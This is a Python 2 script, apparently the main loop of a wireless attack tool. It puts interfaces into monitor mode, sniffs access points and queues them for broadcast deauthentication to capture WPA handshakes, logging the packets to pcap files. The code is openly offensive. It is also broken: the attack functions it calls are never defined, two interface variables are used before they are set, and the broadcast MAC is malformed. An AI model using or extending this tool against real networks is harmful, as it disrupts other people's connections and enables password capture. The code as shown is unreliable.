#!/usr/bin/env python

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys,os,thread,time
from scapy.all import *
import random # Can remove after completion
import Queue
import pyric
import pyric.pyw as pyw
import pyric.lib.libnl as nl
import pyric.utils.channels as ch
import itertools
import optparse

# Global Variables
attack_queue = Queue.Queue()
ap_list = []
attack_list = []

becaon_capture = time.strftime("%Y.%m.%d-%H.%M.%S."+ recon_iface +".pcap")
attack_capture = time.strftime("%Y.%m.%d-%H.%M.%S."+ attack_iface +".pcap")

beacon_pktdump = PcapWriter("./logs/" + becaon_capture, append=True,sync=True)
attack_pktdump = PcapWriter("./logs/" + attack_capture, append=True,sync=True)


client = "FF:FF:FF:FF:FF"  # Set to broadcast to deauth all clients as well.  Increases odds of capturing handshakes
count = 2 # How many Deauth Packets do you want to send?

# Start the application and the threads.
if __name__ == "__main__":
	# Make sure you have at least 2 Wireless Interfaces to Start
	if CheckInterfaces() != True:
		print "Not enough Wireless Interfaces..."
		exit("\nExiting...")

	# Make sure the interfaces are in Monitor Mode
	for ifaces in pyw.winterfaces():
		SetMonitorMode(ifaces,'monitor')

	# Read in the whitelist to make sure to avoid FCC Violations. 
	f = open('whitelist.txt')
	whitelist = f.readlines()

	# Start the threading of the Sniff,Hopping, and Queue
	try:
		print "Sniffing for Beacon Frames..."
		thread.start_new(SniffingBeacons, (recon_iface,))
		thread.start_new(SniffingHandshakes,(attack_iface,))
		thread.start_new(HoppinIface,(recon_iface,))
		thread.start_new(TimeSink, ())

		while True:
			# Report back every 5 seconds of Stats
			time.sleep(5)
			print "Captured APs: %i" % len(ap_list)
			print "Attacked APs: %i" % len(attack_list)
			print "Queue Length: %i" % attack_queue.qsize()
			print "Whitelist Length: %i" % len(whitelist)

	except KeyboardInterrupt:
		sys.exit("\nExiting...")
